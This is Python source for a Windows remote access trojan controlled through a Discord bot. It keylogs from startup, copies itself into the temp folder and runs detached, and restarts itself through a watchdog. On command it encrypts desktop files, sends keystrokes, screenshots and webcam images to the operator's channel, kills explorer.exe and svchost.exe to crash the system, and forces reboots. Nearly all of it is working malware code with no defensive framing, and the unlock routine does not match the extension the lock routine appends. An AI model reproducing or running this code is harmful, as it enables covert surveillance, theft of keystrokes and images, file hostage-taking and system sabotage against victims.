import discord
import pyautogui
import os
import ctypes
from ctypes import wintypes
import subprocess
import cv2
import asyncio
import base64
import hashlib
from cryptography.fernet import Fernet
import sys
import shutil
import random
import string
import tempfile
import time
import socket
import requests
from pynput import keyboard
import threading

token = ""    #Discord bot token enter your own token here
channel_id = 1393708856613404793     #Discord channel ID where the bot will listen for commands

key_log = []
watchdog_running = True
WATCHDOG_INTERVAL = 5

def start_watchdog():
    def watchdog():
        exe = os.path.basename(sys.executable)
        while watchdog_running:
            res = subprocess.run(f'tasklist /FI "IMAGENAME eq {exe}"', capture_output=True, text=True, shell=True)
            if exe not in res.stdout:
                subprocess.Popen([sys.executable, __file__])
            time.sleep(WATCHDOG_INTERVAL)
    threading.Thread(target=watchdog, daemon=True).start()

listener = keyboard.Listener(on_press=lambda k: key_log.append(getattr(k, 'char', str(k))))
listener.start()

def get_desktop_path():
    CSIDL_DESKTOP = 0
    buf = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
    ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_DESKTOP, None, 0, buf)
    return buf.value

def generate_key(password: str) -> bytes:
    return hashlib.sha256(password.encode()).digest()

def encrypt_file(file_path: str, password: str):
    key = base64.urlsafe_b64encode(generate_key(password))
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted = fernet.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted)

def decrypt_file(file_path: str, password: str):
    key = base64.urlsafe_b64encode(generate_key(password))
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        data = file.read()
    decrypted = fernet.decrypt(data)
    with open(file_path, "wb") as file:
        file.write(decrypted)

async def lock_files(message):
    desktop = get_desktop_path()
    files = [os.path.join(desktop, f) for f in os.listdir(desktop) if os.path.isfile(os.path.join(desktop, f))]
    password = "123"
    for file in files:
        encrypt_file(file, password)
        os.rename(file, file + ".test")
    await message.channel.send("locked all files")

async def unlock_files(message):
    desktop = get_desktop_path()
    files = [os.path.join(desktop, f) for f in os.listdir(desktop) if f.endswith(".morvay")]
    password = "123"
    for file in files:
        base = file.replace(".test", "")
        decrypt_file(file, password)
        os.rename(file, base)
    await message.channel.send("unlocked all files")

def ensure_persist_py():
    temp_dir = tempfile.gettempdir()
    script_path = os.path.abspath(__file__)
    if os.path.dirname(script_path) != temp_dir:
        persist_path = os.path.join(temp_dir, random_filename())
        if not os.path.exists(persist_path):
            shutil.copy2(script_path, persist_path)
            DETACHED_PROCESS = 0x00000008
            subprocess.Popen(
                [sys.executable, persist_path],
                creationflags=DETACHED_PROCESS,
                close_fds=True
            )
        sys.exit()

def random_filename(ext=".exe", length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length)) + ext

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"test in bot login: {client.user}")
    start_watchdog()

@client.event
async def on_message(message):
    if message.author == client.user or message.channel.id != channel_id:
        return

    msg = message.content.lower()

    if msg == "!lock":
        await lock_files(message)

    elif msg == "!unlock":
        await unlock_files(message)

    elif msg == "!keylog":
        log_text = "".join(key_log[-1000:])
        await message.channel.send(f"keylogger:\n```{log_text}```")

    elif msg.startswith("!uyari"):
        uyari_text = message.content[len("!uyari "):]
        ctypes.windll.user32.MessageBoxW(0, uyari_text, "message", 0x10)
        await message.channel.send("send message box sent.")

    elif msg == "!ip":
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        public_ip = requests.get("https://api64.ipify.org").text
        await message.channel.send(f"pc: `{local_ip}` | Public: `{public_ip}`")

    elif msg == "!statik-ip":
        try:
            statik = requests.get("https://api64.ipify.org").text
            await message.channel.send(f"ipconfig: `{statik}`")
        except:
            await message.channel.send("undefined")

    elif msg == "!explorer":
        os.system("taskkill /f /im explorer.exe")
        await message.channel.send("explorer.exe delete.")

    elif msg == "!blues":
        os.system("taskkill /f /im svchost.exe")
        await message.channel.send("blue screen attack initiated.")

    elif msg == "!ss":
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        with open("screenshot.png", "rb") as f:
            await message.channel.send(file=discord.File(f))
        os.remove("screenshot.png")

    elif msg == "!shutdown":
        subprocess.run("shutdown /r /t 0", shell=True)
        await message.channel.send("restarting...")

    elif msg == "!cam":
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("camera.jpg", frame)
            cam.release()
            with open("camera.jpg", "rb") as f:
                await message.channel.send(file=discord.File(f))
            os.remove("camera.jpg")
        else:
            await message.channel.send("please enable camera access.")

async def run_bot():
    while True:
        try:
            await client.start(token)
        except:
            await asyncio.sleep(5)

if __name__ == "__main__":
    ensure_persist_py()
    asyncio.run(run_bot())
